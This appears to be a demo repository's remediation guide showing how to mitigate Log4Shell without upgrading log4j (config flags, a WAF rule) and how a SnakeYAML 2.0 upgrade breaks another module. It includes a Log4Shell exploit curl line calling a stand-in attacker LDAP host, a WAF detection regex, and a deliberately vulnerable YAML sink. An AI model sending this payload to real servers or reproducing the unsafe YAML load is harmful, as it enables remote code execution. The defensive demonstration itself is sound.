# MITIGATION.md — the two "hard" remediation scenarios

These two scenarios exist to move the conversation past *"just upgrade the library."*
Real monoliths can't always do that. Both are wired into this repo so you can show
them live.

| Scenario | Vuln used | The point |
|----------|-----------|-----------|
| 1. Non-upgrade mitigating control | Log4Shell — log4j-core 2.14.1 (CVE-2021-44228) | Neutralize the exploit **without** a version bump — in code/config **and** as an App & API Protection virtual patch, and show Datadog marking it mitigated. |
| 2. Upgrade blast radius | SnakeYAML 1.30 → 2.0 (CVE-2022-1471) | The "safe" upgrade **breaks another module in the monolith** at compile time. CI/tests catch it pre-merge; a coding agent can scope the blast radius before it ships. |

---

## Scenario 1 — Non-upgrade mitigating control (Log4Shell)

**Setup / framing for the room:** *"This service logs a client header through log4j
2.14.1. Corporate can't re-qualify a new log4j across 40 downstream services this
quarter, and this app embeds it transitively. We are NOT upgrading right now — so how
do we become safe today?"*

The reachable sink is `StatusController#status`
([src/.../StatusController.java](src/main/java/com/workforce/vms/controller/StatusController.java)),
which logs the `X-Api-Version` header. Exploit:

```bash
curl -H 'X-Api-Version: ${jndi:ldap://attacker.example.com/a}' http://localhost:8080/api/status
```

### Control A — code/config level (no version change)

log4j honors a flag that disables message-pattern lookups. Any one of these works and
**none of them changes the log4j version**:

1. **Environment variable** (already stubbed in `docker-compose.yml`, commented out):
   ```yaml
   # app service → environment:
   LOG4J_FORMAT_MSG_NO_LOOKUPS: "true"
   ```
2. **JVM system property** (add to the `ENTRYPOINT`/`JAVA_TOOL_OPTIONS`):
   ```
   -Dlog4j2.formatMsgNoLookups=true
   ```
3. **Pattern-layout level** — edit `src/main/resources/log4j2.xml`, change `%m` to
   `%m{nolookups}`:
   ```xml
   <PatternLayout pattern="%d{ISO8601} [%t] %-5level %logger{36} - %m{nolookups}%n"/>
   ```
4. **Remove the gadget class** from the artifact (belt-and-suspenders):
   ```
   zip -q -d dd-java-agent/... JndiLookup.class   # or exclude via build
   ```

**Demo it:** turn on control #1, `docker compose up -d --build app`, re-run the curl
above — the `${jndi:...}` string is now logged literally, no outbound JNDI lookup.

### Control B — App & API Protection virtual patch (in-app WAF)

When you can't touch the build at all, virtually patch at the runtime WAF. In Datadog
→ **App and API Protection → Protection → In-App WAF / Custom Rules**, add a custom
rule that matches the exploit pattern on request headers and query/body:

- **Condition:** request header/param value matches regex `\$\{jndi:(ldap|ldaps|rmi|dns):`
  (extend with `\$\{.*(lower|upper|env|sys):` to catch obfuscation).
- **Action:** Block (or Monitor first, then Block).

This produces a **live Signal for every exploit attempt** and, once set to Block,
returns a 403 before the payload reaches the logger — the CVE is *virtually patched*
with zero code change.

### Showing "mitigated / safe" in Datadog

- In **Security → Code Security → Vulnerabilities**, open the Log4Shell finding and set
  its status to **Mitigated / Risk accepted**, with a note pointing at the WAF rule +
  `formatMsgNoLookups`. The finding drops out of the "actionable" queue without a
  version bump.
- Runtime evidence: with AAP blocking on, re-running `scripts/attack.sh` shows the
  Log4Shell attempts as **Blocked** signals rather than exploited — that's your
  "we're safe today" proof.

---

## Scenario 2 — Upgrade blast radius (SnakeYAML)

**Setup / framing:** *"Fine, this one we'll just upgrade. SnakeYAML 1.30 → 2.0 fixes
CVE-2022-1471. Ship it."* — then show why it isn't free.

### The reachable vuln (what SCA/IAST flags)

`VendorController#importYaml`
([src/.../VendorController.java](src/main/java/com/workforce/vms/controller/VendorController.java))
calls `new Yaml().load(userInput)` on attacker-controlled YAML. Fixed in SnakeYAML 2.0
(SafeConstructor by default).

### The blast radius (what breaks on the "safe" upgrade)

A **different module in the same monolith** — the billing-reconciliation config loader
`LegacyConfigParser`
([src/.../legacy/LegacyConfigParser.java](src/main/java/com/workforce/vms/legacy/LegacyConfigParser.java))
— relies on an API that **SnakeYAML 2.0 removed**:

```java
// Valid in 1.30 — REMOVED in 2.0 (surviving overload requires LoaderOptions):
Yaml parser = new Yaml(new Constructor(ReconciliationConfig.class));
```

**Before (snakeyaml 1.30):** `mvn verify` compiles, `LegacyConfigParserTest` passes.

**After (bump `snakeyaml.version` → `2.0` in `pom.xml`):** compilation fails:

```
LegacyConfigParser.java:[line] cannot find symbol
  symbol:   constructor Constructor(java.lang.Class<ReconciliationConfig>)
  location: class org.yaml.snakeyaml.constructor.Constructor
```

The failing compile takes `build-and-test` (and therefore the **Quality Gate**) red in
`.github/workflows/ci.yml`, so the breakage is **caught pre-merge** — CD never runs.

### The fix (what a coding agent proposes after scoping the blast radius)

```java
import org.yaml.snakeyaml.LoaderOptions;
// 2.0-compatible:
Yaml parser = new Yaml(new Constructor(ReconciliationConfig.class, new LoaderOptions()));
```

…and, because `importYaml` used the *unsafe default* constructor, the real fix there is
to switch to a `SafeConstructor`/typed constructor too. The SE story: **Datadog shows
the vulnerable, reachable sink; the CI test suite + quality gate show the upgrade's
blast radius; a coding agent (with the Datadog MCP server) can read the finding, open
the diff, and enumerate every call site that must change before the bump is safe.**

### Try it live

```bash
# 1) Show green baseline
mvn -q -B verify        # passes on 1.30

# 2) Introduce the "safe" upgrade
sed -i '' 's#<snakeyaml.version>1.30</snakeyaml.version>#<snakeyaml.version>2.0</snakeyaml.version>#' pom.xml

# 3) Watch it break (this is the blast radius the gate catches)
mvn -q -B verify        # FAILS to compile LegacyConfigParser

# 4) Revert
git checkout pom.xml
```
